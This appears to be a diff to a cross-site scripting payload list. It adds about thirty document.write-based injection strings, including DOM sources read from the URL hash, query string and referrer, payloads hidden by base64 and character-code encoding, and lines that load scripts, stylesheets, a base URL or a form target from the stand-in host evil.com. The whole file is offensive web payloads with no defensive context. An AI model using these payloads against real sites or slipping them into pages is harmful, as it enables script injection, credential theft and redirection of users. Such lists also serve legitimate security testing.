@@ -1,2 +1,33 @@
-?"><script>alert(1)</script>
-?"><img src=x onerror=alert(1)>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.write('<script>alert(1)<\/script>')</script>
+<script>document.write('<iframe src=javascript:alert(1)>')</script>
+<script>document.write('<a href=javascript:alert(1)>click<\/a>')</script>
+<script>document.write(location.hash.slice(1))</script>
+<script>document.write(location.search.slice(1))</script>
+<script>document.write(decodeURIComponent(location.hash))</script>
+<script>document.write(unescape(location.hash.slice(1)))</script>
+<script>document.writeln('<img src=x onerror=alert(1)>')</script>
+<script>document.writeln(location.hash.slice(1))</script>
+<script>var x=location.hash.slice(1);document.write(x)</script>
+<script>var x=new URLSearchParams(location.search);document.write(x.get('q'))</script>
+<script>var x=location.href.split('?')[1];document.write(x)</script>
+<script>var x=document.referrer;document.write(x)</script>
+<script>document.write('<script src=//evil.com/xss.js><\/script>')</script>
+<script>document.write('<link rel=stylesheet href=//evil.com/evil.css>')</script>
+<script>document.write('<base href=//evil.com/>')</script>
+<script>document.write('<form action=//evil.com/>')</script>
+<script>document.write('<meta http-equiv=refresh content=0;url=javascript:alert(1)>')</script>
+<script>document.write(atob('PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='))</script>
+<script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))</script>
+<script>document.write('<script>alert(1)</script>')</script>
+<script>document.write('<script>alert(1)</script>')</script>
+<script>document.write('<img/src/onerror=alert(1)>')</script>
+<script>document.write('<svg onload=alert(1)>')</script>
+<script>document.write('<details open ontoggle=alert(1)>')</script>
+<script>document.write('<body onload=alert(1)>')</script>
+<script>document.write('<input autofocus onfocus=alert(1)>')</script>
+<script>document.write('<marquee onstart=alert(1)>')</script>
+<script>document.write('<video src=x onerror=alert(1)>')</script>
+<script>document.write('<audio src=x onerror=alert(1)>')</script>
+<script>document.write('<object data=javascript:alert(1)>')</script>
+<script>document.write('<embed src=javascript:alert(1)>')</script>
